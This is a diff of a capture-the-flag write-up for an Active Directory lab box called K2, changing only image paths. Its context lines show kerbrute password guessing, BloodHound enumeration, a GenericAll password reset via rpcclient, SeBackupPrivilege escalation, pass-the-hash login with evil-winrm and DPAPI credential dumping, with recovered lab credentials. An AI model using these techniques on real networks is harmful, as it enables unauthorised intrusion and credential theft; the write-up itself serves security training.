@@ -228,7 +228,7 @@ Using the bruteforcing function of kerbrute try to guessing James's password.
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 [+] VALID LOGIN:  j.bold@k2.thm:#8rockyou
@@ -246,7 +246,7 @@ bloodhound-python -c all -ns 10.10.82.211 -dc K2Server.k2.thm -d k2.thm --zip -u
 
 We can see that the `IT STAFF 1` group has the `GenericAll` privs to `j.smith` account. It means that we can change the j.smith's password.
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 rpcclient -U K2.thm/j.bold K2Server.k2.thm
@@ -279,7 +279,7 @@ Look up the j.smith's privileges we can see this:
 whoami /all
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SeBackupPrivilege PrivEsc
 
@@ -316,7 +316,7 @@ With the Administrator's NTLM we can try to connect through winRM using evil-win
 evil-winrm -i 10.10.82.211 -u 'Administrator' -H '9545b6...0ae86c37b32f'
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Print the root flag
 
@@ -355,5 +355,5 @@ Try to dump other credentials through DPAPI
 <strong>K2\Administrator:vz0q$i8b4c
 </strong></code></pre>
 
-<figure><img src="../../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
